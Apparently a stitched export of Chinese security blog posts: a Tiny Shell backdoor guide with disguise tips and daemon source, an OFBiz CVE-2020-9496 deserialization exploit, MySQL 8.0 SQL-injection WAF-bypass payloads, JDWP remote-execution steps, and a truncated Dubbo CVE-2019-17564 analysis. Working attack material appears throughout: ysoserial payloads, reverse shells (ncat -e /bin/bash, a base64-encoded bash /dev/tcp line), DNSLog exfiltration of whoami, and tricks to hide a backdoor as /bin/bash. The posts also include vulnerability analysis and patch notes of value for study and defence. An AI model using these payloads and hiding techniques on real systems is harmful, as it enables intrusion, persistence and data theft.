在控制端运行tsh程序开启监听： 12chmod u+x tsh./tsh cb 在被控制端运行tshd即可定时反弹shell： 12chmod u+x tshd./tshd 正向连接在编译前注释掉tsh.h文件中关于反向连接的两个设置： 12//#define CONNECT_BACK_HOST \"控制端地址\"//#define CONNECT_BACK_DELAY 30 先在被控制端运行tshd： 12chmod u+x tshd./tshd 然后在控制端运行tsh程序发起正向连接： 12chmod u+x tsh./tsh 被控制端IP 文件传输正向连接下载文件： 1./tsh 被控制端IP get /etc/passwd ./ 上传文件改为put即可： 1./tsh 被控制端IP put aaa.sh /tmp 简单隐蔽前面的默认操作隐蔽性弱、容易被用户发现，比如不修改程序名直接运行的话通过lsof命令还是能看到原程序名的： 修改下名称： 1mv tshd bash 看到还是有个缺点，就是通过pwdx命令查看程序所在路径会有所暴露，因此可以进一步移动到可执行程序常在的目录中伪装，一般系统的bash位于/bin/bash或/usr/bin/bash，笔者的环境/usr/bin下没有bash就放到这里了，其他如/usr/sbin目录也可以： 但是遇到个问题，放到目录下无法正常正向连接。参考这篇文章说的，在tsh.c中看到是执行bash --login命令的，但是该bash程序并没有指定执行的路径，依靠目标环境变量PATH的值设置的路径来逐个寻找： 而测试的目标主机PATH环境变量为PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin，即/usr/bin在正常bash目录/bin的前面，导致没有执行到正常的bash。因此修改下其中的bash为绝对路径的bash即可： 重新编译上传运行，就OK了： 看到ps -ef命令的结果，其中-bash是正常的bash进程，而12611和12613都是后门守护进程、其伪装成/bin/bash，12614为后门守护进程执行系统命令exec /bin/bash --login反弹的shell进程。 除此之外，连接的端口号也需要改为常用的端口以便于隐藏。 0x02 后门清理以反连为例，查看异常bash连接端口、进程ID等，如果攻击者没有修改程序名且没有魔改直接编译使用的话，可以通过对比看/proc/pid/comm的真实进程名来查杀即可： 正连类似的，用lsof命令也能直接分析出来。 至于修改程序名或魔改后的后门程序，可自行根据实际情况分析，这里没有细究。 0x03 原理浅析tsh代码简洁，这里仅看看它服务端即tshd的关键部分。 执行后门tshd后，先是重写cmdline为用户设置的伪装进程名（默认为/bin/bash），然后主进程会fork一个子进程1，父进程退出，该子进程1则成为孤儿进程被init托管： 1234567891011121314151617/* overwrite cmdline */memset((void *)argv[0], '\\0', strlen(argv[0]));strcpy(argv[0], FAKE_PROC_NAME);/* fork into background */pid = fork();if( pid &lt; 0 )&#123; return( 1 );&#125;if( pid != 0 )&#123; return( 0 );&#125; 在后面的循环处理中，当子进程1成功连接上控制端监听的端口之后，会又fork一个子进程2用于处理建立好的连接，而该子进程2的父进程即子进程1会等待子进程2执行完再继续往下执行： 12345678910111213141516/* fork a child to handle the connection */pid = fork();if( pid &lt; 0 )&#123; close( client ); continue;&#125;if( pid != 0 )&#123; waitpid( pid, NULL, 0 ); close( client ); continue;&#125; 子进程2接着会fork一个子进程3，然后子进程2退出，从而使得子进程3脱离了其祖父进程即子进程1成为孤儿进程、被init托管、成为守护进程，子进程3中开始真正进行交互shell/文件传输操作： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* the child forks and then exits so that the grand-child's * father becomes init (this to avoid becoming a zombie) */pid = fork();if( pid &lt; 0 )&#123; return( 8 );&#125;if( pid != 0 )&#123; return( 9 );&#125;/* setup the packet encryption layer */.../* get the action requested by the client */.../* howdy */switch( message[0] )&#123; case GET_FILE: ret = tshd_get_file( client ); break; case PUT_FILE: ret = tshd_put_file( client ); break; case RUNSHELL: ret = tshd_runshell( client ); break; default: ret = 12; break;&#125;shutdown( client, 2 );return( ret ); 而在后面调用tshd_runshell()函数中，其中会再次fork子进程4来专门进行新建会话来反弹shell，而子进程4的父进程即子进程3则进行信息的接受和发送： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116 /* fork to spawn a shell */ pid = fork(); if( pid &lt; 0 ) &#123; return( 43 ); &#125; if( pid == 0 ) &#123; /* close the client socket and the pty (master side) */ close( client ); close( pty ); /* create a new session */ if( setsid() &lt; 0 ) &#123; return( 44 ); &#125; /* set controlling tty, to have job control */#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF if( ioctl( tty, TIOCSCTTY, NULL ) &lt; 0 ) &#123; return( 45 ); &#125;#else#if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX &#123; int fd; fd = open( slave, O_RDWR ); if( fd &lt; 0 ) &#123; return( 46 ); &#125; close( tty ); tty = fd; &#125;#endif#endif /* tty becomes stdin, stdout, stderr */ dup2( tty, 0 ); dup2( tty, 1 ); dup2( tty, 2 ); if( tty &gt; 2 ) &#123; close( tty ); &#125; /* fire up the shell */ shell = (char *) malloc( 8 ); if( shell == NULL ) &#123; return( 47 ); &#125; shell[0] = '/'; shell[4] = '/'; shell[1] = 'b'; shell[5] = 's'; shell[2] = 'i'; shell[6] = 'h'; shell[3] = 'n'; shell[7] = '\\0'; execl( shell, shell + 5, \"-c\", temp, (char *) 0 ); /* d0h, this shouldn't happen */ return( 48 ); &#125; else &#123; /* tty (slave side) not needed anymore */ close( tty ); /* let's forward the data back and forth */ while( 1 ) &#123; FD_ZERO( &amp;rd ); FD_SET( client, &amp;rd ); FD_SET( pty, &amp;rd ); n = ( pty &gt; client ) ? pty : client; if( select( n + 1, &amp;rd, NULL, NULL, NULL ) &lt; 0 ) &#123; return( 49 ); &#125; if( FD_ISSET( client, &amp;rd ) ) &#123; ret = pel_recv_msg( client, message, &amp;len ); if( ret != PEL_SUCCESS ) &#123; return( 50 ); &#125; if( write( pty, message, len ) != len ) &#123; return( 51 ); &#125; &#125; if( FD_ISSET( pty, &amp;rd ) ) &#123; len = read( pty, message, BUFSIZE ); if( len == 0 ) break; if( len &lt; 0 ) &#123; return( 52 ); &#125; ret = pel_send_msg( client, message, len ); if( ret != PEL_SUCCESS ) &#123; return( 53 ); &#125; &#125; &#125; return( 54 ); &#125; 小结下来，大致如下： 12345678910111213father -&gt; X -&gt; child1 | ---- |init -&gt; child1 -&gt; # waitpid(child2) -&gt; child2 -&gt; X -&gt; child3 | --------------------- |init -&gt; child3 -&gt; # send &amp; receive message -&gt; child4 # reverse shell 当然，可以自行魔改实现更高的隐蔽性和更强的免杀。 0x04 参考短小精干的Unix类后门Tiny shell的使用与分析","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"工具","slug":"工具","permalink":"https://www.mi1k7ea.com/tags/工具/"}]},{"title":"浅析Ofbiz反序列化漏洞（CVE-2020-9496）","date":"2021-09-21T11:36:17.000Z","path":"2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/","text":"0x00 前言学习学习。 0x01 基础知识Apache Ofbiz简介OFBiz是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。 OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。 OFBiz 已经正式成为 Apache 的顶级项目: Apache OFBiz。 XML-RPC简介XML-RPC是一个规范和一组实现，允许软件在不同的操作系统上运行，在不同的环境中运行以通过网络进行过程调用。 XML-RPC是使用 HTTP 作为传输和 XML 作为编码的远程过程调用。XML-RPC 被设计得尽可能简单，同时允许传输、处理和返回复杂的数据结构。 XML-RPC请求与数据类型 XML-RPC请求响应相关内容具体参考：http://xmlrpc.com/spec.md XML-RPC数据类型具体参考：https://ws.apache.org/xmlrpc/types.html 这里只看和PoC中构造相关的内容。 XML-RPC请求示例： 123456789101112131415POST /RPC2 HTTP/1.0User-Agent: Frontier/5.1.2 (WinNT)Host: betty.userland.comContent-Type: text/xmlContent-length: 181&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt; &lt;methodName&gt;examples.getStateName&lt;/methodName&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodCall&gt; 简单说明： XML-RPC请求的Content-Type为text/xml； XML-RPC请求内容的根标签为&lt;methodCall&gt;，而该标签下必须有&lt;methodName&gt;子标签来指定调用的方法名； 如果过程调用有参数，&lt;methodCall&gt;必须包含一个&lt;params&gt;子标签，&lt;params&gt;子标签可以包含任意数量的&lt;param&gt;，每个都有一个&lt;value&gt;标签来指定参数值内容； 其中&lt;value&gt;标签中的参数值默认为string类型，可以指定&lt;struct&gt;类型子标签、其中包含&lt;member&gt;并且每个&lt;member&gt;包含一个&lt;name&gt;和一个&lt;value&gt;； 如果XML-RPC服务端设置了enabledForExtensions，那么就支持附加的数据类型，其中包括&lt;serializable&gt;标签，其中的内容为一个对象被转换为序列化的表示形式并作为Base64编码的字节数组。 0x02 漏洞原理在17.12.04之前版本的Ofbiz中，其中的未授权访问XMLRPC接口/webtools/control/xmlrpc存在反序列化漏洞，攻击者可通过该接口实现RCE。 0x03 影响版本&lt; 17.12.04 0x04 环境搭建参考Vulhub：https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/ 0x05 漏洞复现使用ysoserial生成payload： 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 \"ping -nc 1 ofbiz.xudce2.dnslog.cn\" | base64 | tr -d \"\\n\" 向/webtools/control/xmlrpc接口发送payload，base64-payload换为生成的payload内容： 1234567891011121314151617181920212223POST /webtools/control/xmlrpc HTTP/1.1Host: your-ipContent-Type: application/xmlContent-Length: 4093&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt; &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt; &lt;struct&gt; &lt;member&gt; &lt;name&gt;test&lt;/name&gt; &lt;value&gt; &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;[base64-payload]&lt;/serializable&gt; &lt;/value&gt; &lt;/member&gt; &lt;/struct&gt; &lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodCall&gt; 冲： 0x06 漏洞分析根据漏洞接口/webtools/control/xmlrpc找到webtools应用目录。 先看到配置文件framework/webtools/webapp/webtools/WEB-INF/web.xml，其中设置了enabledForExtensions为true来使得XML-RPC支持&lt;serializable&gt;这种标签进行Java序列化数据的传输： 而其中看到针对/control/接口的处理是由org.apache.ofbiz.webapp.control.ControlServlet来操作的： 到ControlServlet类中，看到doPost()实际调用的就是doGet()、其中先调用getRequestHandler()函数来初始化org\\apache\\ofbiz\\webapp\\control\\RequestHandler类，而RequestHandler类在初始化时会从/WEB-INF/controller.xml配置文件中获取控制器URL配置即请求URL映射表，然后设置对应的ViewFactory和EventFactory： 到/WEB-INF/controller.xml中查看，对应xmlrpc URI的URL配置中，在&lt;security&gt;标签中并没有设置对应的auth选项、默认为false即不需要身份验证，这就导致了本次未授权RCE的存在： 回到doGet()函数中，往下会调用刚刚新建的RequestHandler类对象的doRequest()函数进一步处理请求，其中会调用runEvent()函数来根据Event类型调用对应EventHandler的invoke()函数，这里实际调用就是前面初始化RequestHandler类对象时设置的XmlRpcEventHandler的invoke()函数、其中先调用getXmlRpcConfig()函数获取XmpRpc相关配置（开启enabledForExtensions）、然后再调用execute()函数作进一步处理： 跟进去，其中调用getRequest()函数来获取XmlRpcRequest类实例，在getRequest()函数中则是通过设置XmlRpcRequestParser作为ContentHandler，然后在解析前对XXE进行了防御： 往下，就是采用SAX的方式来解析XML内容的过程了，调用过程大致为：SAXParserImpl类parse()-&gt;XML11Configuration类parse()-&gt;XMLDocumentFragmentScannerImpl类scanDocument()-&gt;XMLDocumentScannerImpl#PrologDispatcher类dispatch()，在dispatch()中触发扫描XML内容。 其中具体的扫描解析过程这里不多说，直接看到后面是会调用之前设置的ContentHandler.startElement()即XmlRpcRequestParser.startElement()来开始扫描元素、其支持对methodCall、methodName、params、param、value等标签的解析，如果非上述标签则调用父类RecursiveTypeParserImpl.startElement()来进行解析、其中由于typeParser类型解析器为空会调用到getParser()函数来获取对应的解析器进行元素解析： 这里是调用的TypeFactoryImpl类的getParser()函数来根据标签类型获取对应的解析器。这里只关注看到本次漏洞关键的serializable标签的部分即可，在解析过程中识别到是serializable标签就会返回SerializableParser（当然，在getParser()函数中看到获取到SerializableParser前需要满足一个前提条件即xmlns必须为http://ws.apache.org/xmlrpc/namespaces/extensions，这就是为啥构造PoC的serializable标签要带上含有该属性值的原因）： 跟进SerializableParser中，由于解析获取完serializable标签的内容后，会调用该类的getResult()函数来获取解析结果，而该函数中会直接调用readObject()进行反序列化操作，从而导致反序列化漏洞的存在： 至此，大致触发流程就分析完了。 0x07 补丁分析官方更新：https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a#diff-bb54e344de72488b4e358a9d8fd385a5d9a6aea32d7236e7c268889f6ba3a8f6 就是给该/webtools/control/xmlrpc接口添加了认证，杜绝了未授权RCE： 0x08 参考Apache Ofbiz RCE (CVE-2020-9496) 漏洞分析","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Ofbiz","slug":"Ofbiz","permalink":"https://www.mi1k7ea.com/tags/Ofbiz/"}]},{"title":"浅析MySQL8.0新特性利用","date":"2021-09-01T14:51:45.000Z","path":"2021/09/01/利用MySQL8-0新特性绕过WAF/","text":"0x01 MySQL 8.0环境搭建在PHPstudy中支持的MySQL 8版本为8.0.12，但是实际利用到的新特性是在MySQL 8.0.19之后才出现的，因此需要自行搭建对应的MySQL环境。 这里就本地下载Windows最新版搭建，参考菜鸟教程进行Windows本地安装：https://www.runoob.com/mysql/mysql-install.html 接着，在my.ini文件中添加如下内容： 1default_authentication_plugin=mysql_native_password 安装好运行登录之后需要修改密码： 12alter user 'root'@'localhost' identified by 'root';FLUSH PRIVILEGES; 最后重启MySQL服务即可： 12net stop mysqlnet start mysql 0x02 MySQL 8.0新特性TABLE语句用法简介官方文档：https://dev.mysql.com/doc/refman/8.0/en/table.html TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列。 用法： 1TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] TABLE与SELECTTABLE语句在某些方面的行为类似于SELECT。给定存在一个名为的表t，以下两个语句将产生相同的输出： 12TABLE t;SELECT * FROM t; 比如： TABLE和SELECT关键区别： TABLE始终显示表的所有列； TABLE不允许对行进行任意过滤，也就是说，TABLE不支持任何WHERE子句； 可以通过ORDER BY和LIMIT这两各关键字实现限制返回的表列来获取指定的行。 UNION联合查询替换TABLE可以替换UNION SELECT结构，也可以和SELECT交叉使用，注意两个table的列数必须相同： 1234table security.users union table security.referers;select * from security.users union select * from security.referers;select * from security.users union table security.referers;table security.users union select * from security.referers; SELECT xx INTO OUTFILE替换可以使用TABLE替换SELECT xx INTO OUTFILE的SELECT： 12table security.users into outfile 'D:\\\\tmp\\\\dump.txt';select * from security.users into outfile 'D:\\\\tmp\\\\dump.txt'; 注意，在使用INTO OUTFILE语句的时候，MySQL会报错： 1ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement 此时，输入如下sql查询语句： 1234567mysql&gt; show global variables like &apos;%secure_file_priv%&apos;;+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | NULL |+------------------+-------+1 row in set, 1 warning (0.00 sec) 看到secure_file_priv的值为NULL，表示限制不能导入导出。 secure_file_priv参数用于限制LOAD DATA、SELECT xx INTO OUTFILE、LOAD_FILE()等： NULL：表示限制mysqld不允许导入或导出； /tmp：表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行； 没有值：表示不限制mysqld在任意目录的导入导出； 又因为secure_file_priv参数是只读参数，不能使用set global命令修改。 正确的解决办法是在my.ini中添加如下配置，然后重启MySQL即可： 1secure_file_priv='' 现在就没问题了： SELECT xx INTO DUMPFILE替换和前面OUTFILE是类似的，关键区别在于： OUTFILE导出全部数据，DUMPFILE只能导出一行数据； OUTFILE在将数据写到文件里时有特殊的格式转换，而DUMPFILE则保持原数据格式； 因此，在使用DUMPFILE时需要结合limit选定指定行： 1table security.users limit 1 into dumpfile 'D:\\\\tmp\\\\dump.txt'; 子查询替换当子查询的表只有单列时，可以使用TABLE语句来替换SELECT进行子查询： 123select * from security.users where username in (table security.vips);select * from security.users where username in (select * from security.vips);select * from security.users where username in (select name from security.vips); INSERT xx SELECT替换参考文档改下即可： https://dev.mysql.com/doc/refman/8.0/en/insert-select.html CREATE TABLE/VIEW xx SELECT替换参考文档改下即可： https://dev.mysql.com/doc/refman/8.0/en/create-table-select.html https://dev.mysql.com/doc/refman/8.0/en/create-view.html VALUES语句用法简介官方文档：https://dev.mysql.com/doc/refman/8.0/en/values.html VALUES是MySQL 8.0.19中引入的DML语句，该语句返回一组一个或多个行作为表。换句话说，它是一个表值构造函数，还可以充当独立的SQL语句。 用法： 12345678910VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...]value_list: value[, value][, ...]column_designator: column_index 该语句由VALUES关键字组成，后跟一个或多个行构造函数的列表，以逗号分隔。行构造函数由ROW()行构造子句组成，该子句的值列表包含在括号中的一个或多个标量值。值可以是任何MySQL数据类型的文字，也可以是解析为标量值的表达式。 ROW()不能为空（但提供的每个标量值可以为NULL），并且在同一条VALUES语句中的每个语句的列的数量必须相同。 简单地说，VALUES语句可以用来构造表： 1234567mysql&gt; values row(\"q\", 42, '2020-02-01'), row(23, \"abc\", 98.6), row(27.0002, \"Mary Smith\", '&#123;\"a\": 10, \"b\": 25&#125;') limit 2,1;+----------+------------+--------------------+| column_0 | column_1 | column_2 |+----------+------------+--------------------+| 27.0002 | Mary Smith | &#123;\"a\": 10, \"b\": 25&#125; |+----------+------------+--------------------+1 row in set (0.00 sec) 从输出表的列中看到，其中有隐含命名的列column_0、column_1、 column_2等等，索引从0开始，可使用limit输出指定行。其中的列可以是混合类型。 UNION联合查询替换根据VALUES语句构造表的特性，可以和UNION联合查询中的SELECT语句进行交叉替换使用： 12345select * from security.users union select 1,2,3;select * from security.users union values row(1,2,3);select * from security.users union values row(1,2,3), row(4,5,6);values row('a','b','c') union select * from security.users;values row('a','b','c') union values row(1,2,3); // 可完全省略不用union 0x03 在SQL注入中的利用由前面知道，TABLE和VALUES这两个语句可用于替换UNION联合查询中的SELECT进行查询，因此这部分新特性主要针对SELECT部分的过滤进行绕过利用。 这里以sqli-labs为例。 VALUES ROW()替换ORDER BY推测列数推测列数无需ORDER BY，直接用VALUES语句即可： 12?id=0&apos; union values row(1,2)%23?id=0&apos; union values row(1,2,3)%23 UNION VALUES联合查询应用UNION VALUES语句就能直接调用数据库内置函数查询对应的信息： 1?id=0&apos; union values row(1,user(),version())%23 可以结合concat系列函数进行利用： 1?id=0&apos; union values row(1,null,concat_ws(char(32,58,32),user(),database(),version()))%23 如果WAF仅仅是过滤UNION SELECT关键字，并没有对UNION VALUES后面添加SELECT进行过滤，那么可以像正常一样利用SELECT结合concat做子查询来dump库： 1?id=0&apos; union values row(1,null,(select group_concat(concat_ws(char(32,58,32),id,username,password)) from users))%23 当然，也可以组合TABLE语句进行查询，注意此时TABLE语句指定的表必须是只有一列且限制只能输出一行： 1?id=0&apos; union values row(1,null,(table vips limit 0,1))%23 UNION TABLE联合查询使用UNION TABLE的时候，注意两个表的列数必须相同： 1?id=0&apos; union table referers limit 0,1%23 盲注利用小于号会逐个比较一行中每一列值的大小来进行盲注，当然，除了小于号、其他比较符可自行构造，如下： 1234?id=0&apos; or (1,&apos;d&apos;,&apos;&apos;) &lt; (table users limit 1)%23?id=0&apos; or (1,&apos;e&apos;,&apos;&apos;) &lt; (table users limit 1)%23?id=0&apos; or (1,&apos;dumb&apos;,&apos;dumb&apos;) &lt; (table users limit 1)%23?id=0&apos; or (1,&apos;dumb&apos;,&apos;dumb&apos;) = (table users limit 1)%23 0x04 xx绕过本地测试xx当前版本号为V4.0.23137。 用UNION SELECT妥妥的直接被拦截了： 使用UNION VALUES就能成功绕过： 使用UNION TABLE也能成功绕过，但要注意两个表的列数必须相同才行： 直接使用TABLE语句盲注查询，会被拦截： 关键的拦截特征在于将or与后面字符匹配到了，这里利用注释符的一个Trick来实现绕过： 1?id=0&apos; or/*!90000mmmmmmmm*/(1,&apos;d&apos;,&apos;&apos;) &lt; (table users limit 0,1)%23 盲注当然是OK的，就是注入过程比较慢，这里可以使用前面说到的UNION VALUES后面添加SELECT查询的方式来尝试，原payload当然会被拦截： 这里推测WAF过滤的关键点也是在于UNION之后以及SELECT之后的关键词正则匹配，要断开这种关键词匹配同样使用前面的Trick即可： 1?id=0&apos; union/*!90000mmmmmmmm*/values row(1,null,(select/*!90000mmmmmmmm*/group_concat(concat_ws(char(32,58,32),id,username,password)) from users))%23 OK，确实可以绕过xx。 0x0n 参考TABLE Statement VALUES Statement MYSQL8.0注入新特性","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"MySQL","slug":"MySQL","permalink":"https://www.mi1k7ea.com/tags/MySQL/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.mi1k7ea.com/tags/SQL注入/"}]},{"title":"浅析JDWP远程命令执行漏洞","date":"2021-08-06T05:02:14.000Z","path":"2021/08/06/浅析JDWP远程代码执行漏洞/","text":"0x00 前言学习 0x01 基本概念JPDAJPDA（Java Platform Debugger Architecture）即Java平台调试体系架构，其整体架构如图： 整体分为三层： JVMTI：Java VM Tool Interface即JVM工具接口。Debuggee即被调试者是由被调试的应用程序（未显示）、运行应用程序的VM和调试器后端组成。为了可远程调试，JVM实例必须使用命令行参数-Xdebug以及参数-Xrunjdwp（或-agentlib）显式启动。其中调试器后端是使用JVMTI来定义JVM提供的调试服务； JDWP：Java Debug Wire Protocol是Debugger和JVM实例之间的通信协议； JDI：Java Debug Interface即Java调试接口，是JDWP协议的客户端，调试器通过其来远程调试目标JVM中的应用； JDWPJDWP（Java Debugger Wire Protocol）即Java调试线协议，是一个为Java调试而设计的通讯交互协议。在JPDA（Java Platform Debugger Architecture）中，它定义了调试器（Debugger）和被调试的JVM（Debuggee）之间的通信协议。 具体JDWP协议可参考官方文档：https://docs.oracle.com/en/java/javase/11/docs/specs/jdwp/jdwp-protocol.html 0x02 JDWP远程命令执行漏洞漏洞原理如果目标Java应用开启了JDWP服务且对外开放，则攻击者可利用JDWP实现远程代码执行。 环境搭建以Windows为例，下载Tomcat到本地，在startup.bat中上面添加如下代码开启debug模式： 1SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000 跑起Tomcat即可。 FOFA语法1banner=&quot;jdwp&quot; 服务探测有三种常用方式来进行JDWP服务探测，原理都是一样的，即向目标端口连接后发送JDWP-Handshake，如果目标服务直接返回一样的内容则说明是JDWP服务。 Nmap使用Nmap扫描： 1nmap -sT -sV 192.168.192.1 -p 8000 扫描会识别到JDWP服务，且有对应的JDK版本信息： Telnet使用Telnet命令探测，需要马上输入JDWP-Handshake，然后服务端返回一样的内容，证明是JDWP服务： 脚本使用如下脚本扫描也可以，直接连接目标服务发送JDWP-Handshake，然后接受到相同内容则说明是JDWP服务： 12345678910import socketclient = socket.socket()client.connect((\"127.0.0.1\", 8000))client.send(b\"JDWP-Handshake\")if client.recv(1024) == b\"JDWP-Handshake\": print(\"[*]JDWP Service!\")client.close() 漏洞利用漏洞利用可借助以下三个工具。 jdwp-shellifier直接用GitHub上已有的工具：https://github.com/IOActive/jdwp-shellifier 该工具通过编写了一个JDI（JDWP客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。 需要Python2运行。 默认break on是在java.net.ServerSocket.accept方法上， 1python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd \"calc\" 直接设置断点函数为java.lang.String.indexOf会更快速： 1python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on \"java.lang.String.indexOf\" --cmd \"calc\" 但是前面的命令虽然执行了但是看不到回显，在Linux环境下可以利用DNSLog外带回显： 1python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on \"java.lang.String.indexOf\" --cmd \"ping -nc 1 `whoami`.xxx.dnslog.cn\" 反弹shell： 1234python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on \"java.lang.String.indexOf\" --cmd \"ncat -lvvp 1234 -e /bin/bash\"# 下面这种不能直接运行/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&gt;&amp;1来反弹# 跟Java的exec()反弹一个原理，可用Base64绕过python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on \"java.lang.String.indexOf\" --cmd \"bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\" msf在msf中可以使用exploit/multi/misc/java_jdwp_debugger模块进行攻击利用。 原理是去找sleeping中的线程，然后下发单步指令是程序断下来，从而触发命令执行。 jdbjdb是JDK中自带的命令行调试工具。 这里是按照msf中的方式搞： attach到远程JDWP服务； threads命令查看所有线程，查找sleeping的线程； thread sleeping的线程id，然后stepi进入该线程； 通过print|dump|eval命令，执行Java表达式从而达成命令执行； 这里本地-attach参数连接会出差，换为下面的方式： 1jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000 执行命令： 1eval java.lang.Runtime.getRuntime().exec(\"calc\") 当然是可以实现直接回显的，可自行研究。 防御方法 关闭JDWP服务，或限制JDWP服务不对外开放； 关闭Java Debug模式； 0x03 参考Hacking the Java Debug Wire Protocol – or – “How I met your Java debugger” https://docs.oracle.com/en/java/javase/11/docs/specs/jpda/architecture.html JDWP无依赖攻击","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"浅析Dubbo HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）","date":"2021-07-03T09:12:38.000Z","path":"2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/","text":"0x00 前言学习Dubbo历史洞。 0x01 漏洞原理Apache Dubbo在使用HTTP协议进行通信时，是直接使用了Spring框架的org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter类做远程调用的，而这个过程会读取POST请求的Body内容并进行反序列化操作，从而导致反序列化漏洞的存在进而RCE。 0x02 影响版本 Apache Dubbo 2.7.0 to 2.7.4； Apache Dubbo 2.6.0 to 2.6.7； Apache Dubbo all 2.5.x； 0x03 环境搭建十分方便的环境搭建可参考Vulhub：https://github.com/vulhub/vulhub/tree/master/dubbo/CVE-2019-17564 这里采用本地搭建的方式。 下载dubbo-samples项目中的dubbo-samples-http子项目：https://github.com/apache/dubbo-samples 当前下载的项目Dubbo版本是2.7.7，直接修改pom中的dubbo.version为漏洞版本是会引起maven错误的，直接在dubbo对应的dependency标签中的添加&lt;version&gt;2.7.3&lt;/version&gt;即可： 接着，因为默认项目中是没有已知的可利用Gadget的，需要在pom中添加CC链依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt;&lt;/dependency&gt; 下载zookeeper到本地，运行服务端，默认监听地址0.0.0.0:2181。 然后运行即可。如果显示http端口被占用，在http-provider.xml中修改一下监听的端口号即可： 1&lt;dubbo:protocol name=\"http\" id=\"http\" port=\"$&#123;servlet.port:8081&#125;\" server=\"$&#123;servlet.container:tomcat&#125;\"/&gt; 正常跑起来，其中会显示Dubbo Provider注册到Register中的HTTP服务名： 0x04 漏洞复现一般攻击者是需要通过向Register查询才知道Dubbo Provider对外提供了哪些接口服务的。 这里用zookeeper的客户端直接连接查询： 1zkCli.cmd -server 127.0.0.1:2181 获取到Dubbo Provider对外接口为： 1org.apache.dubbo.samples.http.api.DemoService 使用ysoserial工具生成CC4链的payload： 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 \"calc.exe\" &gt; dubbo.poc 将payload POST到Dubbo Provider目标接口即可触发漏洞： 0x05 调试分析根据前面的报错栈信息，在HttpInvokerServiceExporter类的readRemoteInvocation()函数中打上断点直接调试。 首先HttpServlet在处理请求分发时会调用到org/apache/dubbo/remoting/http/servlet/DispatcherServlet类的service()函数，其中会尝试获取HttpHandler，若handler对象为null即找不到目标服务时就会返回404，反之进一步调用handler对象的handle()函数来处理请求： 跟进，获取URI后，然后Dubbo是使用spring-web中的HttpInvokerServiceExporter类对象skeleton来获取对应的，判断如果请求方式不是POST则直接响应500，是的话则直接设置RPC远程服务地址，然后调用HttpInvokerServiceExporter类对象skeleton的handleRequest()函数进一步处理请求，这里Content-Type为application/x-java-serialized-object即Java序列化数据类型： 往下，就进入到Spring框架的HttpInvokerServiceExporter类的handleRequest()函数中，然后调用到doReadRemoteInvocation()函数，其中调用readObject()函数对POST内容进行Java原生反序列化操作： 再往下就是Java原生反序列化触发CC4链的过程： 此时函数调用栈： 12345678910111213141516171819202122232425262728293031323334353637383940414243transform:124, InstantiateTransformer (org.apache.commons.collections4.functors)transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)transform:112, ChainedTransformer (org.apache.commons.collections4.functors)compare:81, 